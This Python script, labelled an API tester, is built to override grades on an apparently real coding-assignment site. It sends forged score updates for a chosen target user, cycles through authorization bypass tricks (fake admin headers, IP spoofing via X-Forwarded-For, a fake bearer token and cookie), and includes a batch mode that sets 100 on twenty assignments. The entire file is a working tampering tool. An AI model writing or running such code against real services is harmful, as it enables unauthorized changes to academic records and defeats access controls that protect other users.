#!/usr/bin/env python3
"""
Quick CoolCode API Tester
Simple script to test the score override API manually
"""

import requests
import json

def test_score_api():
    """Test the score API with various approaches"""
    
    base_url = "https://coolcode-hacker-34c5455cd908.herokuapp.com"
    score_endpoint = f"{base_url}/api/api/assignment/score"
    
    # Get user input
    print("🔥 CoolCode Score API Tester 🔥")
    print("=" * 40)
    
    username = input("Enter target username: ").strip()
    if not username:
        print("❌ Username required!")
        return
    
    assignment_id = input("Enter assignment ID (1-20): ").strip()
    try:
        assignment_id = int(assignment_id)
    except ValueError:
        assignment_id = 1
        print(f"Using default assignment ID: {assignment_id}")
    
    score = input("Enter score (0-100): ").strip()
    try:
        score = int(score)
    except ValueError:
        score = 100
        print(f"Using default score: {score}")
    
    print(f"\n🎯 Target: {username}")
    print(f"📝 Assignment: {assignment_id}")
    print(f"⭐ Score: {score}")
    print(f"🌐 API: {score_endpoint}")
    print("-" * 40)
    
    # Prepare payload
    payload = {
        "username": username,
        "assignmentId": assignment_id,
        "score": score
    }
    
    # Test different approaches
    approaches = [
        {
            "name": "Direct Request",
            "headers": {
                "Content-Type": "application/json"
            }
        },
        {
            "name": "With Origin Header",
            "headers": {
                "Content-Type": "application/json",
                "Origin": base_url,
                "Referer": f"{base_url}/ui/"
            }
        },
        {
            "name": "Admin Headers",
            "headers": {
                "Content-Type": "application/json",
                "X-Admin": "true",
                "X-Role": "admin"
            }
        },
        {
            "name": "IP Spoofing",
            "headers": {
                "Content-Type": "application/json",
                "X-Forwarded-For": "127.0.0.1",
                "X-Real-IP": "127.0.0.1"
            }
        },
        {
            "name": "Fake Authentication",
            "headers": {
                "Content-Type": "application/json",
                "Authorization": "Bearer fake_token",
                "Cookie": "admin=true"
            }
        }
    ]
    
    print("🚀 Testing different approaches...")
    print()
    
    success_count = 0
    
    for i, approach in enumerate(approaches, 1):
        print(f"[{i}/{len(approaches)}] Testing: {approach['name']}")
        
        try:
            response = requests.post(
                score_endpoint,
                json=payload,
                headers=approach['headers'],
                timeout=10
            )
            
            print(f"    Status: {response.status_code}")
            print(f"    Response: {response.text[:100]}{'...' if len(response.text) > 100 else ''}")
            
            if response.status_code == 200:
                print("    🎉 SUCCESS! Score may have been updated!")
                success_count += 1
            elif response.status_code == 401:
                print("    🔒 Authentication required")
            elif response.status_code == 403:
                print("    🚫 Forbidden")
            elif response.status_code == 404:
                print("    ❓ Endpoint not found")
            else:
                print(f"    ❌ Failed with status {response.status_code}")
                
        except requests.exceptions.RequestException as e:
            print(f"    💥 Request failed: {e}")
        
        print()
    
    print("=" * 40)
    if success_count > 0:
        print(f"🎯 SUCCESS! {success_count}/{len(approaches)} approaches worked!")
        print("✅ Score override may have been successful!")
        print("💡 Try logging into the CoolCode UI to verify the score change.")
    else:
        print("❌ All approaches failed.")
        print("💡 Try:")
        print("   - Different usernames")
        print("   - Different assignment IDs")
        print("   - Browser developer tools")
        print("   - Intercepting legitimate requests")
    print("=" * 40)

def batch_test():
    """Test multiple assignments at once"""
    print("🔥 Batch Score Override Test 🔥")
    print("=" * 40)
    
    username = input("Enter target username: ").strip()
    if not username:
        print("❌ Username required!")
        return
    
    base_url = "https://coolcode-hacker-34c5455cd908.herokuapp.com"
    score_endpoint = f"{base_url}/api/api/assignment/score"
    
    print(f"🎯 Testing assignments 1-20 for user: {username}")
    print("-" * 40)
    
    success_assignments = []
    
    for assignment_id in range(1, 21):
        payload = {
            "username": username,
            "assignmentId": assignment_id,
            "score": 100
        }
        
        try:
            # Try the simplest approach first
            response = requests.post(
                score_endpoint,
                json=payload,
                headers={"Content-Type": "application/json"},
                timeout=5
            )
            
            if response.status_code == 200:
                print(f"✅ Assignment {assignment_id:2d}: SUCCESS")
                success_assignments.append(assignment_id)
            else:
                print(f"❌ Assignment {assignment_id:2d}: Failed ({response.status_code})")
                
        except requests.exceptions.RequestException:
            print(f"💥 Assignment {assignment_id:2d}: Connection failed")
    
    print("-" * 40)
    print(f"🎯 Results: {len(success_assignments)}/20 assignments successful")
    if success_assignments:
        print(f"✅ Successful assignments: {success_assignments}")
    print("=" * 40)

def main():
    """Main menu"""
    while True:
        print("\n🔥 CoolCode API Tester 🔥")
        print("1. Test single assignment")
        print("2. Batch test (assignments 1-20)")
        print("3. Exit")
        
        choice = input("\nSelect option (1-3): ").strip()
        
        if choice == "1":
            test_score_api()
        elif choice == "2":
            batch_test()
        elif choice == "3":
            print("👋 Goodbye!")
            break
        else:
            print("❌ Invalid choice!")

if __name__ == "__main__":
    main()
